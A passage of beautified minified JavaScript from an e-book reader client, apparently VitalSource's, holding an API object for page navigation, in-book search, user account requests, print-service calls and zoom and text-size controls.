            getEPUBFile: function(e, i, t) {
                f.ajax({
                    url: VST.Book.buildURL(e),
                    success: function(e, t, n) {
                        var o = {
                            content: e,
                            type: n.getResponseHeader("content-type")
                        };
                        i(o)
                    },
                    error: u(t)
                })
            },
            goToCFI: function(e, t, n) {
                p(e, t, n)
            },
            goToFigure: function(e, t) {
                var n;
                Jigsaw.navigationRequested(),
                n = "string" == typeof e || e instanceof String ? VST.Book.buildAPIURL("/content/id/" + e) : e.uuid ? VST.Book.buildAPIURL("/content/id/" + e.uuid) : VST.Book.buildAPIURL("/cfi" + e.cfi),
                Jigsaw.navigateTo(n, function() {
                    t && t()
                })
            },
            goToURL: function(e, t) {
                Jigsaw.navigationRequested();
                var n = VST.Book.buildURL(e);
                Jigsaw.navigateTo(n, function() {
                    t()
                })
            },
            goToFullURL: function(e, t) {
                Jigsaw.navigationRequested(),
                Jigsaw.navigateTo(e, function() {
                    t()
                })
            },
            goToPage: function(e, t, n) {
                V(e, t, n)
            },
            goToSearchResult: function(e, t, n) {
                y(e, t, n)
            },
            goToBookmark: function(e, t) {
                var n;
                Jigsaw.navigationRequested(),
                VST.Book.isEpub() ? (cfi = e.epub_cfi || e.epubCfi, n = VST.Book.buildURL("/cfi" + cfi)) : n = VST.Book.isPBK() ? VST.Book.buildURL("/pageid/" + e.pbkPage) : VST.Book.buildURL("/offset/" + e.chapterOffset + "?c=" + encodeURIComponent(e.chapterTitle)),
                Jigsaw.navigateTo(n, function() {
                    t && t()
                })
            },
            enter: function(f, h, p) {
                if (f.exclusive && f.end && -1 !== f.end.indexOf("/")) {
                    for (var e = VST.Utils.stripCFIAssertions(f.end).split(/@|~/)[0].split("/"), t = e.pop(); -1 !== t.indexOf(":");)
                        t = t.pop();
                    (t = parseInt(t, 10)) % 2 == 0 && (f.end = e.concat(t - 1).join("/"))
                }
                VST.sharedEpubModule.exitContentRange && VST.sharedEpubModule.exitContentRange(),
                Jigsaw.socket.getContentRange(f, function(d) {
                    if (d.startPage || d.endPage || d.startBase && d.startPath || d.endBase && d.endPath)
                        VST.Book.getCurrentPage(function(e, t) {
                            var n = function(e, t, n) {
                                var o = {
                                    width: 0,
                                    height: 0
                                };
                                if (e.cfi && (0 === Jigsaw.CFIUtils.compareCFIs(t, e.startBase) && (i = e.startPath), 0 === Jigsaw.CFIUtils.compareCFIs(t, e.endBase) && (r = e.endPath), o = (e = new VST.sharedEpubModule.CFIRangeNode("", i, r, "", "", "")).limitContentRange()), Jigsaw.unbind("page:ready", w), Jigsaw.bind("page:ready", w, !0), VST.fire("snippet:ready", o), n)
                                    return n()
                            };
                            f.page = d.page,
                            f.cfi = d.cfi,
                            VST.snippetSettings = f;
                            var i = "",
                                r = "",
                                o = b(t),
                                a = t.getCFIWithoutAssertions();
                            if (f.doNotNavigate || !f.page || isPageInSnippet(o.pageIndex))
                                n(d, a, h, p);
                            else if (Jigsaw.once("page:ready", function() {
                                setTimeout(function() {
                                    n(d, c, h, p)
                                }, 10)
                            }), d.startPage || d.endPage) {
                                var s = d.startPage;
                                s === undefined && (s = d.endPage);
                                var l = VST.Book.buildURL("/cfi/" + s);
                                Jigsaw.navigateTo(l, function() {})
                            } else {
                                var c = d.startBase || d.endBase,
                                    u = VST.Book.buildURL("/cfi" + c);
                                Jigsaw.navigateTo(u, function() {})
                            }
                        });
                    else if (p)
                        return p()
                })
            },
            exit: function(e, t) {
                VST.snippetSettings = undefined,
                Jigsaw.unbind("page:ready", w),
                VST.sharedEpubModule.exitContentRange(),
                VST.fire("snippet:exit"),
                t && t()
            },
            goTo: function() {},
            snippetHasNextPage: function(o) {
                VST.Book.getNextPage(function(e, t) {
                    t.length || o(!1);
                    var n = b(t[0]);
                    o(isInSnippet(n.pageIndex || n.cfi))
                })
            },
            snippetHasPreviousPage: function(o) {
                VST.Book.getPreviousPage(function(e, t) {
                    t.length || o(!1);
                    var n = b(t[t.length - 1]);
                    o(isInSnippet(n.pageIndex || n.cfi + "!/999998"))
                })
            },
            getPreview: function(e, t, n) {
                var o = VST.sharedEpubModule.locateCFI(e);
                if (o.error)
                    return n("node not found");
                for (var i = o.node, r = 0, a = 300, s = ""; r < a && i;) {
                    for (; 0 <= ["body", "head", "div", "section"].indexOf(i.tagName.toLowerCase());) {
                        for (var l = !1, c = 0; c < i.childNodes.length; c++) {
                            if (l = !0, "#text" !== i.childNodes[c].nodeName) {
                                i = i.childNodes[c];
                                break
                            }
                            l = !1
                        }
                        if (!l)
                            break
                    }
                    if ("#text" === i.nodeName || ["script", "meta", "link", "style", "head"].indexOf(i.tagName.toLowerCase()) < 0) {
                        var u = i.innerText;
                        u.length + r > a && (u = u.substring(0, a - r)),
                        r += u.length,
                        s += x(i, u)
                    }
                    i = i.nextElementSibling ? i.nextElementSibling : i.parentElement.nextElementSibling
                }
                t(s)
            },
            searchInSnippet: function(c, u, d, e) {
                S(),
                T({
                    term: c
                });
                var f,
                    h = (u = VST.Utils.stripCFIAssertions(u)).split("!")[0],
                    p = !0;
                g(VST.Book.getISBN(), c, function(e) {
                    for (var t = [], n = 0; n < e.length; n++) {
                        var o = e[n];
                        if (v(o.cfi) || isPageInSnippet(o.id))
                            for (var i = 0; i < o.term_locs.length; i++) {
                                var r = jQuery.extend({}, o);
                                r.term_locs = [o.term_locs[i]],
                                o.term_cfis && (r.term_cfis = [o.term_cfis[i]]),
                                r.siblingsCount = o.term_locs.length,
                                r.termIndex = i,
                                r.searchedTerm = c;
                                var a = r.cfi || "/" + r.id,
                                    s = VST.Utils.stripCFIAssertions(a).split("!")[0],
                                    l = -1 < Jigsaw.CFIUtils.compareCFIs(a, u);
                                p && (h === s || l) && (f = t.length, l && (p = !1)),
                                t.push(r)
                            }
                    }
                    d({
                        results: t,
                        focusIndex: f = f || 0
                    })
                }, e)
            },
            waldoSearchInSnippet: function(c, u, d, e) {
                S(),
                T({
                    term: c
                });
                var f,
                    h = (u = VST.Utils.stripCFIAssertions(u)).split("!")[0],
                    p = !0;
                m(VST.Book.getISBN(), c, function(e) {
                    for (var t = [], n = 0; n < e.length; n++) {
                        var o = e[n];
                        if (v(o.cfi) || isPageInSnippet(o.id))
                            for (var i = 0; i < o.term_locs.length; i++) {
                                var r = jQuery.extend({}, o);
                                r.term_locs = [o.term_locs[i]],
                                o.term_cfis && (r.term_cfis = [o.term_cfis[i]]),
                                r.siblingsCount = o.term_locs.length,
                                r.termIndex = i,
                                r.searchedTerm = c;
                                var a = r.cfi || "/" + r.id,
                                    s = VST.Utils.stripCFIAssertions(a).split("!")[0],
                                    l = -1 < Jigsaw.CFIUtils.compareCFIs(a, u);
                                p && (h === s || l) && (f = t.length, l && (p = !1)),
                                t.push(r)
                            }
                    }
                    d({
                        results: t,
                        focusIndex: f = f || 0
                    })
                }, e)
            },
            focusTerm: function(u, d) {
                y(u, function() {
                    0 === VST.$(VST.document.body).find(".vst-search-term").length && T({
                        term: u.searchedTerm
                    });
                    var i,
                        e = VST.$(VST.document.body).find(".vst-focused-term");
                    if (e.removeClass("vst-focused-term"), e.css("background", e.data("old-background")), u.term_cfis) {
                        for (var t = VST.sharedEpubModule.locateCFI(u.term_cfis[0].base).node.parentNode, n = t.getElementsByClassName("vst-search-term").length; n < u.siblingsCount;)
                            n = (t = t.parentNode).getElementsByClassName("vst-search-term").length;
                        i = t.getElementsByClassName("vst-search-term")[u.termIndex],
                        f(i).addClass("vst-focused-term"),
                        f(i).data("old-background", f(i).css("background")),
                        f(i).css(
                        "background", "#ffa758")
                    } else if (VST.Book.isPBK() && u.term_locs) {
                        var o = VST.$(VST.document.body).find("#pbk-search").find(".pbk-glyph.vst-search-term"),
                            r = u.term_locs[0].len,
                            a = u.term_locs[0].pos;
                        for (n = 0; n < o.length; n++) {
                            var s = f(o[n]),
                                l = s.data("glyph");
                            a <= l && l < a + r && (s.addClass("vst-focused-term"), s.data("old-background", s.css("background")), s.css("background", "#ffa758"))
                        }
                        i = VST.$(VST.document.body).find(".vst-focused-term");
                        var c = function() {
                            var e;
                            VST.unbind("page:transform", c);
                            var t = function(e) {
                                    var t = VST.scrollElement;
                                    f.isWindow(t) && (t = f(t.document).find("html, body")),
                                    f(t).stop(),
                                    e = (100 < e ? e - 100 : 0) + "px",
                                    f(t).animate({
                                        scrollTop: e
                                    }, 500)
                                },
                                n = 0,
                                o = setInterval(function() {
                                    10 <= (n += 1) && clearInterval(o),
                                    i && i[0] && 0 === i[0].getBoundingClientRect().top || 0 <= (e = i && i.offset() && i.offset().top || -1) && (clearInterval(o), t(e))
                                }, 100)
                        };
                        VST.bind("page:transform", c)
                    } else
                        i = VST.document.getElementsByClassName("vst-search-term")[u.termIndex],
                        f(i).addClass("vst-focused-term"),
                        f(i).data("old-background", f(i).css("background")),
                        f(i).css("background", "#ffa758");
                    d && d()
                })
            },
            isActive: function(e) {
                return e(!!VST.snippetSettings)
            },
            reloadPage: function(e) {
                Jigsaw.reloadPage(function() {
                    e && e()
                })
            },
            highlightTerm: function(e, t, n) {
                if (!T(e))
                    return n("Term cannot be blank");
                t && t()
            },
            unhighlightTerms: function() {
                S(),
                success && success()
            },
            goToHighlight: function(e, t, n) {
                Jigsaw.navigateToHighlight(e, t, n)
            },
            goToPreviousPage: function(n, o) {
                VST.Book.goToPreviousPage(function(e, t) {
                    e ? o(e.message) : n(t)
                })
            },
            goToNextPage: function(n, o) {
                VST.Book.goToNextPage(function(e, t) {
                    e ? o(e.message) : n(t)
                })
            },
            hasPreviousPage: function(n, o) {
                VST.Book.hasPreviousPage(function(e, t) {
                    e ? o(e.message) : n(t)
                })
            },
            hasNextPage: function(n, o) {
                VST.Book.hasNextPage(function(e, t) {
                    e ? o(e.message) : n(t)
                })
            },
            getNextPage: function(n, o) {
                VST.Book.getNextPage(function(e, t) {
                    e ? o(e.message) : n(b(t[0]))
                })
            },
            getPreviousPage: function(n, o) {
                VST.Book.getPreviousPage(function(e, t) {
                    e ? o(e.message) : n(b(t[t.length - 1]))
                })
            },
            stripCFIAssertions: function(e) {
                return VST.sharedEpubModule.StripCFIAssertions(e)
            },
            compareCFIs: function(e, t) {
                return Jigsaw.Utils.CFIUtils.compareCFIs(e, t)
            },
            getContainerDimensions: function() {
                return Jigsaw.getContainerDimensions()
            },
            focus: function() {
                return Jigsaw.focus()
            },
            scrollTo: function(e, t) {
                o(parseInt(e, 10), t)
            },
            scrollToTop: function(e) {
                o(0, e)
            },
            scrollToBottom: function(e) {
                o(999999999, e)
            },
            scrollToLeft: function(e) {
                n(0, e)
            },
            touchEventsEnabled: function(e) {
                return Jigsaw.touchEventsEnabled("", e)
            },
            setCursor: function(e) {
                return Jigsaw.setCursor(e)
            },
            resetCursor: function() {
                return Jigsaw.resetCursor()
            },
            getCFIForPoint: function(e, t) {
                for (var n = VST.Utils.scrollTop(), o = VST.Utils.scrollLeft(), i = VST.document.elementFromPoint(e.x, e.y); -1 !== i.className.indexOf("vstignore");)
                    i = i.parentElement;
                t({
                    cfi: VST.sharedEpubModule.GetCFIForNode(i),
                    nodeRect: {
                        top: i.offsetTop - n,
                        left: i.offsetLeft - o,
                        right: i.offsetLeft - o + i.offsetWidth,
                        bottom: i.offsetTop - n + i.offsetHeight,
                        width: i.offsetWidth,
                        height: i.offsetHeight
                    }
                })
            },
            getPositionForCFI: function(l, c, u) {
                VST.Book.getCurrentPage(function(e, t) {
                    var n = t.getCFIWithoutAssertions(),
                        o = l.split("!");
                    if (1 === o.length)
                        l = o[0];
                    else {
                        if (VST.sharedEpubModule.StripCFIAssertions(o[0]) !== n)
                            return u("node not found");
                        l = o[1]
                    }
                    var i = VST.sharedEpubModule.locateCFI(l);
                    if (i.error)
                        return u("node not found");
                    var r = i.node,
                        a = VST.Utils.scrollTop(),
                        s = VST.Utils.scrollLeft();
                    return c({
                        cfi: l,
                        nodeRect: {
                            top: r.offsetTop - a,
                            left: r.offsetLeft - s,
                            right: r.offsetLeft - s + r.offsetWidth,
                            bottom: r.offsetTop - a + r.offsetHeight,
                            width: r.offsetWidth,
                            height: r.offsetHeight
                        }
                    })
                })
            },
            searchMetadata: function(e, t, n) {
                f.ajax({
                    url: "/search/metadata",
                    type: "GET",
                    data: {
                        q: e
                    },
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            getBookList: function(e, n, o) {
                Array.prototype.slice.call(arguments, 0).length < 3 && (o = n, n = e, e = {});
                var t = {};
                for (var i in e)
                    e.hasOwnProperty(i) && (t[h(i)] = e[i]);
                VST.User.getBooks(t, function(e, t) {
                    e ? o(e.message) : n(t)
                })
            },
            getExpiredBooks: function(e, t) {
                f.ajax({
                    url: "/books/expired",
                    type: "GET",
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            getBookInfo: function(e, t, n) {
                Array.isArray(e) ? f.ajax({
                    url: "/info/books",
                    data: {
                        isbns: e
                    },
                    type: "GET",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                }) : f.ajax({
                    url: "/books/:isbn".replace(":isbn", e),
                    type: "GET",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            getSubscriptions: function(e, t) {
                f.ajax({
                    url: "/user/subscriptions",
                    type: "GET",
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            getUserInfo: function(n, o) {
                VST.User.getInfo(function(e, t) {
                    e ? u(o)(e.message) : d(n)(t)
                })
            },
            requestUserActivation: function(e, t, n) {
                f.ajax({
                    url: "/activation_requests",
                    type: "POST",
                    dataType: "json",
                    data: {
                        redirect: e
                    },
                    success: d(t),
                    error: u(n)
                })
            },
            requestEmailVerification: function(e, t, n) {
                var o = i(e);
                f.ajax({
                    url: "/user/email-verification",
                    type: "POST",
                    dataType: "json",
                    data: o,
                    success: d(t),
                    error: u(n)
                })
            },
            getUserGroups: function(e, t) {
                f.ajax({
                    url: "/user/groups",
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            getUserFollowers: function(e, t) {
                f.ajax({
                    url: "/user/followers",
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            getUserFollowings: function(e, t) {
                f.ajax({
                    url: "/user/followings",
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            unfollowUser: function(e, t, n) {
                f.ajax({
                    url: "/user/followings/" + e,
                    method: "delete",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            blockUser: function(e, t, n) {
                f.ajax({
                    url: "/user/followers/" + e + "/blocks",
                    method: "post",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            unblockUser: function(e, t, n) {
                f.ajax({
                    url: "/user/blocks/" + e,
                    method: "delete",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            getBlocks: function(e, t) {
                f.ajax({
                    url: "/user/blocks",
                    method: "get",
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            getCollections: function(e, t) {
                f.ajax({
                    url: "/collections",
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            ssoUser: function(e, t, n) {
                f.ajax({
                    url: "/user/sso",
                    type: "POST",
                    data: {
                        redirect: e
                    },
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            setFlag: function(e, t, n, o) {
                f.ajax({
                    url: "/user/flag",
                    type: "POST",
                    data: {
                        name: e,
                        enabled: t
                    },
                    dataType: "json",
                    success: d(n),
                    error: u(o)
                })
            },
            oldSSOUser: function(e, t, n) {
                f.ajax({
                    url: "/user/old_sso",
                    type: "POST",
                    data: {
                        redirect: e
                    },
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            createLTILaunch: function(e, t, n) {
                Array.prototype.slice.call(arguments, 0).length < 3 && (n = t, t = e, e = {});
                var o = e;
                !o.isbn && VST.Book && (o.isbn = VST.Book.getISBN()),
                f.ajax({
                    url: "/user/lti",
                    type: "POST",
                    data: {
                        launch: o
                    },
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            printOnDemandURL: function(e, t) {
                f.ajax({
                    url: "/user/pod",
                    type: "GET",
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            setUserInfo: function(e, t, n) {
                var o = i(e);
                f.ajax({
                    url: "/user",
                    type: "PUT",
                    data: {
                        user: o,
                        jigsaw_brand: o.jigsaw_brand
                    },
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            getDevices: function(e, t) {
                f.ajax({
                    url: "/user/devices",
                    type: "GET",
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            getPreferredLanguages: function(e, t) {
                f.ajax({
                    url: "/user/languages",
                    type: "GET",
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            deactivateDevice: function(e, t, n) {
                f.ajax({
                    url: "/user/devices/" + e,
                    type: "DELETE",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            verifyV3Recaptcha: function(e, t, n) {
                f.ajax({
                    url: "/user/verify-v3-recaptcha",
                    type: "POST",
                    data: {
                        token: e
                    },
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            forgotPassword: function(e, t, n) {
                var o = i(e);
                f.ajax({
                    url: "/forgot",
                    type: "POST",
                    data: {
                        forgot: o
                    },
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            updateForgottenPassword: function(e, t, n) {
                var o = i(e);
                f.ajax({
                    url: "/forgot/" + e.token,
                    type: "PUT",
                    data: {
                        user: o
                    },
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            redeemCode: function(e, t, n) {
                f.ajax({
                    url: "/user/redeem",
                    type: "POST",
                    data: {
                        code: e
                    },
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            search: function(e, t, n, o) {
                Array.prototype.slice.call(arguments, 0).length < 4 && (o = n, n = t, t = {}),
                t.q = e,
                f.ajax({
                    url: "/search",
                    type: "GET",
                    data: t,
                    dataType: "json",
                    success: d(n),
                    error: u(o)
                })
            },
            waldoSearch: function(t, n, o, i) {
                var r = function(t, o) {
                    return function(n) {
                        if (t) {
                            var e = Object.keys(n.results);
                            n.results = e.map(function(e) {
                                var t = n.results[e];
                                return t.isbn = e.replace(".DASHPUB", ""), t
                            }).filter(function(e) {
                                return e.count && 0 < e.count
                            }),
                            t(f.extend(n, o))
                        }
                    }
                };
                e(n, function(e) {
                    f.ajax({
                        url: "//search.vitalsource.com/search/counts",
                        type: "GET",
                        dataType: "json",
                        data: f.extend(n || {}, {
                            q: t
                        }),
                        headers: {
                            "x-vitalsource-search-token": e.token
                        },
                        success: r(o, e),
                        error: u(i)
                    })
                })
            },
            sendMobileAppLinkText: function(e, t, n) {
                f.ajax({
                    url: "/bandwidth_messages/mobile_apps",
                    type: "POST",
                    data: {
                        bandwidth_message: e
                    },
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            sendMobileAppLinkEmail: function(e, t, n) {
                f.ajax({
                    url: "/emails/mobile_apps",
                    type: "POST",
                    data: {
                        email: e
                    },
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            generateCaptcha: function(e, t) {
                f.ajax({
                    url: "/captcha",
                    type: "GET",
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            createUser: function(e, t, n) {
                var o = i(e);
                f.ajax({
                    url: "/user",
                    type: "POST",
                    data: {
                        user: o,
                        "g-recaptcha-response": o.recaptcha_response,
                        jigsaw_brand: o.jigsaw_brand
                    },
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            mergeAccount: function(e, t, n) {
                f.ajax({
                    url: "/user/merge",
                    type: "POST",
                    data: {
                        user: e
                    },
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            signOut: function(t, e) {
                f.ajax({
                    url: "/logout",
                    type: "DELETE",
                    dataType: "json",
                    success: function(e) {
                        Jigsaw.trigger("user:signout"),
                        d(t)(e)
                    },
                    error: u(e)
                })
            },
            updateLicense: function(e, t) {
                f.ajax({
                    url: "/user/update_license",
                    type: "POST",
                    data: {},
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            asyncUpdateLicense: function(e, t) {
                f.ajax({
                    url: "/user/async_license",
                    type: "POST",
                    data: {},
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            asyncLicenseStatus: function(e, t, n) {
                f.ajax({
                    url: "/user/" + e + "/async_license_status",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            userExists: function(e, t, n) {
                f.ajax({
                    url: "/user/" + e + "/exists",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            addEvents: function(e, t, n) {
                e.length || (e = [e]),
                f.ajax({
                    url: "/events",
                    type: "POST",
                    data: {
                        events: e
                    },
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            fitToHeight: function() {
                VST.Book.isPBK() && VST.PictureBook.fitToHeight()
            },
            fitToWidth: function() {
                VST.Book.isPBK() && VST.PictureBook.fitToWidth()
            },
            printPageRange: function(e, t, n) {
                n("//" + VST.window.location.hostname + VST.Book.buildAPIURL("/print") + "?from=" + e + "&to=" + t)
            },
            mimeoGetPrintRequest: function(t, n) {
                a(function(e) {
                    f.ajax({
                        url: "https://print.vitalsource.com/requests/" + t,
                        type: "GET",
                        contentType: "application/json",
                        dataType: "json",
                        data: {
                            token: e.token
                        },
                        headers: {},
                        success: d(n),
                        error: u(n)
                    })
                })
            },
            mimeoClaimPrintRequest: function(n, o, i) {
                a(function(e) {
                    var t = "https://print.vitalsource.com/requests/" + n + "/claim?token=" + e.token;
                    o.locale && (t = t + "&locale=" + o.locale),
                    o.auto_print && (t += "&auto_print=true"),
                    o.post_message_print && (t += "&post_message_print=true"),
                    o.async && (t += "&async=true"),
                    i(t)
                })
            },
            mimeoPrintPageRangeAsync: function(e, t, n, o) {
                n = Object.assign({}, n, {
                    async: !0
                }),
                F(e, t, n, function(t) {
                    f.ajax({
                        url: t,
                        type: "GET",
                        dataType: "json",
                        headers: {},
                        success: d(function(e) {
                            o(Object.assign({}, e, {
                                printPath: t
                            }))
                        }),
                        error: u(o)
                    })
                })
            },
            mimeoPrintPageRange: function(e, t, n, o) {
                F(e, t, n, function(e) {
                    o(e)
                })
            },
            getBookPrintSummary: function(t) {
                a(function(e) {
                    f.ajax({
                        url: "//print.vitalsource.com/books/" + VST.Book.getISBN(),
                        type: "GET",
                        dataType: "json",
                        data: {
                            token: e.token
                        },
                        headers: {},
                        success: d(t),
                        error: u(t)
                    })
                })
            },
            getPrintLimits: function(t) {
                a(function(e) {
                    f.ajax({
                        url: "//print.vitalsource.com/print/" + VST.Book.getISBN() + "/limits",
                        type: "GET",
                        dataType: "json",
                        data: {
                            token: e.token
                        },
                        headers: {},
                        success: d(t),
                        error: u(t)
                    })
                })
            },
            getPrintHistory: function(t, n) {
                a(function(e) {
                    f.ajax({
                        url: "//print.vitalsource.com/print/" + VST.Book.getISBN() + "/history",
                        type: "GET",
                        dataType: "json",
                        data: f.extend(t || {}, {
                            page: t.page || 1,
                            pageSize: t.pageSize || 100,
                            token: e.token
                        }),
                        headers: {},
                        success: d(n),
                        error: u(n)
                    })
                })
            },
            getPageRange: function(t, n, o) {
                a(function(e) {
                    f.ajax({
                        url: "/books/" + VST.Book.getISBN() + "/pages/range/" + t + "/" + n,
                        dataType: "json",
                        data: {
                            token: e.token
                        },
                        success: d(o),
                        error: u(o)
                    })
                })
            },
            getLifetimePages: function(t) {
                a(function(e) {
                    f.ajax({
                        url: "//print.vitalsource.com/print/" + VST.Book.getISBN() + "/copies",
                        type: "GET",
                        dataType: "json",
                        data: {
                            token: e.token
                        },
                        headers: {},
                        success: d(t),
                        error: u(t)
                    })
                })
            },
            subscribeTo: function(e, t, n) {
                f.ajax({
                    url: "/user/subscriptions",
                    type: "POST",
                    dataType: "json",
                    data: {
                        email: e
                    },
                    success: d(t),
                    error: u(n)
                })
            },
            unsubscribeFrom: function(e, t, n) {
                f.ajax({
                    url: "/user/subscriptions/" + e,
                    type: "DELETE",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            befriendUser: function(e, t, n) {
                var o = i(e);
                f.ajax({
                    url: "/user/subscriptions/befriend",
                    type: "POST",
                    dataType: "json",
                    data: o,
                    success: d(t),
                    error: u(n)
                })
            },
            unfriendUser: function(e, t, n) {
                f.ajax({
                    url: "/user/subscriptions/unfriend",
                    type: "DELETE",
                    dataType: "json",
                    data: {
                        email: e
                    },
                    success: d(t),
                    error: u(n)
                })
            },
            getFriends: function(e, t) {
                f.ajax({
                    url: "/user/subscriptions/friends",
                    type: "GET",
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            autoSubscribe: function(e, t) {
                f.ajax({
                    url: "/user/subscriptions/auto_subscribe",
                    type: "POST",
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            copyHighlight: function(e, t) {
                var n = ".highlight_" + e,
                    o = f(VST.document.body).find(n),
                    i = VST.document.createRange();
                i.setStart(o[0], 0),
                i.setEndAfter(o[o.length - 1]),
                VST.window.getSelection().addRange(i);
                var r = VST.Book.getCopyLimit(),
                    a = VST.Book.limitSelection(r, "copy");
                t(0 == r ? "Copying not allowed" : a),
                VST.window.getSelection().removeAllRanges()
            },
            copySelection: function(e, t) {
                VST.Book.handleCopy() ? e(VST.Utils.getSelectedText()) : t("copying not allowed")
            },
            getUniversalURL: function(t, e) {
                var n = VST.Book.getFormat().toLowerCase();
                if ("pbk" === n)
                    return t(VST.Book.buildURL("/pageid/" + VST.currentPageData.index));
                if ("epub" == n) {
                    var o = VST.currentPageData.cfi.split("!")[0] + "!" + VST.sharedEpubModule.GetCFIForCurrentScrollPosition(),
                        i = VST.Book.buildURL("/epubcfi" + c(o));
                    return i = i.replace("epub/", ""), t(i)
                }
                var r = VST.sharedEpubModule.GetNodeForCurrentScrollPosition(!0),
                    a = r.getAttribute("eid");
                !a && r.parentElement && (a = r.parentElement.getAttribute("eid")),
                a && "" !== a ? f.ajax({
                    url: VST.Book.buildURL("/eid/" + a),
                    dataType: "json",
                    type: "GET",
                    success: function(e) {
                        t(VST.Book.buildURL("/id/" + e.pointer))
                    },
                    error: u(e)
                }) : e("node not found")
            },
            _getDocumentHTML: function() {
                if (!VST.document)
                    return null;
                var e;
                try {
                    e = f(VST.documents).find("html")
                } catch (t) {
                    return null
                }
                return e
            },
            _setPositionDPS: function() {
                var e = f(".page-content");
                if (e[1])
                    for (var t, n = function(e, t) {
                            for (var n, o = e.contentDocument.getElementsByTagName("meta"), i = 0; i < o.length && !n; i++)
                                if ("viewport" === o[i].name)
                                    for (var r = o[i].content.split(/\, */), a = 0; a < r.length; a++) {
                                        if (r[a].split("=")[0] === t) {
                                            n = parseInt(r[a].split("=")[1], 10);
                                            break
                                        }
                                    }
                            return VST.zoomScaleFactor * n
                        }, o = 0; o < e.length; o++) {
                        var i = n(e[o], "width"),
                            r = n(e[o], "height"),
                            a = f(e[o].contentDocument.body),
                            s = parseInt(a.css("marginLeft"), 10);
                        i = i + parseInt(a.css("marginRight"), 10) + s,
                        0 === o ? t = i : e[o].style.left = t + "px",
                        e[o].style.position = "absolute",
                        e[o].width = i + "px",
                        e[o].height = r + "px"
                    }
            },
            increaseZoomScale: function(e) {
                var t = A._getDocumentHTML();
                VST.FeatureChecks.hasAutoExpandingIframe() && (t = f(".page-content")),
                VST.zoomScaleFactor = VST.zoomScaleFactor || 1,
                VST.zoomScaleFactor += .25,
                1 === VST.zoomScaleFactor ? t.css("transform", "") : t.css("transform", "scale(" + VST.zoomScaleFactor + ")"),
                t.css("transform-origin", "top left"),
                A._setPositionDPS(),
                VST.fire("page:transform");
                var n = 3;
                VST.zoomScaleFactor == n ? e({
                    message: "zoom limit reached",
                    zoomScale: VST.zoomScaleFactor
                }) : e({
                    message: "success",
                    zoomScale: VST.zoomScaleFactor
                })
            },
            decreaseZoomScale: function(e) {
                var t = A._getDocumentHTML();
                VST.FeatureChecks.hasAutoExpandingIframe() && (t = f(".page-content")),
                VST.zoomScaleFactor = VST.zoomScaleFactor || 1,
                VST.zoomScaleFactor -= .25,
                1 === VST.zoomScaleFactor ? t.css("transform", "") : t.css("transform", "scale(" + VST.zoomScaleFactor + ")"),
                t.css("transform-origin", "top left"),
                A._setPositionDPS(),
                VST.fire("page:transform");
                var n = .25;
                VST.zoomScaleFactor == n ? e({
                    message: "zoom limit reached",
                    zoomScale: VST.zoomScaleFactor
                }) : e({
                    message: "success",
                    zoomScale: VST.zoomScaleFactor
                })
            },
            setZoomScale: function(e, t) {
                VST.zoomScaleFactor = e;
                var n = A._getDocumentHTML();
                1 === VST.zoomScaleFactor ? n.css("transform", "") : n.css("transform", "scale(" + VST.zoomScaleFactor + ")"),
                n.css("transform-origin", "top left"),
                A._setPositionDPS(),
                VST.fire("page:transform"),
                t({
                    message: "success",
                    zoomScale: VST.zoomScaleFactor
                })
            },
            getZoomScale: function(e) {
                e({
                    message: "success",
                    zoomScale: VST.zoomScaleFactor
                })
            },
            dictionaryLookup: function(e, t, n) {
                f.ajax({
                    url: "/dictionary/pearson/-currentWord-".replace("-currentWord-", encodeURIComponent(e)),
                    type: "GET",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            increaseTextSize: function(e, t) {
                if (VST.Book.isPBK())
                    return e(zoomPDF("increase"));
                var n = A._getDocumentHTML(),
                    o = 4,
                    i = VST.textSize || "1.00",
                    r = parseFloat(i);
                if (2 < (r += .25) && (r += .25), parseFloat(r) > o)
                    t({
                        message: "cannot exceed text size limit"
                    });
                else {
                    var a = 100 * r + "%";
                    n.css("font-size", a),
                    parseFloat(r) == o ? e({
                        message: "text limit reached",
                        textSize: (VST.textSize = r).toString()
                    }) : e({
                        message: "success",
